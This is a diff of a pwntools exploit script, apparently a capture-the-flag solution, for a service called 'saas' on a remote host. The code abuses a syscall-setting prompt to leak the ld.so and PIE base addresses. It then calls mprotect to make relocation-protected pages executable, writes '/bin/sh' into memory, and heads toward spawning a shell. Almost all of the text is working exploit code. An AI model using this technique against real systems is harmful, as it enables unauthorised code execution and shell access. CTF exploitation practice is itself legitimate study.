@@ -1,5 +1,5 @@
 from pwn import *
-elf = ELF('./saas', checksec=False)
+elf = ELF('./saas.patch', checksec=False)
 
 def set_reg(rax, rdi=0, rsi=0, rdx=0, r10=0, r9=0, r8=0, ret=True):
     p.sendlineafter(b'(decimal):', b'%d' % rax)
@@ -17,11 +17,11 @@ if __name__ == '__main__':
     p =remote('jh2i.com', 50016)
     ldaddr = eval(set_reg(9, 0, 10, 0, 2 | 32)) # mmap PROT_EXEC with MAP_SHARED | MAP_ANONYMOUS
     log.info('ld.so address at 0x%x' % ldaddr)
-    set_reg(1, rdi=1, rsi=ldaddr + 0x3190, rdx=8, ret=False) # leak pie address from ld.so
-    elf.address = u64(p.recvuntil('\x00R')[1:][:-1].ljust(8, b'\x00'))# - 0x52a8
+    set_reg(1, rdi=1, rsi=ldaddr + 0x3190, rdx=8, ret=False) # leak pie address from ld.so (offset from ubuntu 19.10)
+    elf.address = u64(p.recvuntil('\x00R')[1:][:-1].ljust(8, b'\x00'))
     
     log.info('elf base address at 0x%x' % elf.address)
-    set_reg(0xa, elf.address, 0x5000, 7) # set off full relro 
+    set_reg(0xa, elf.address, 0x5000, 7) # from full relro to rwx pages
     set_reg(0, 0, elf.bss() + 0x100, 8, ret=False)
     p.sendline(b'/bin/sh\x00') # inset /bin/sh to bss
     set_reg(0, 0, elf.address + 0x000012cb, 2, ret=False)
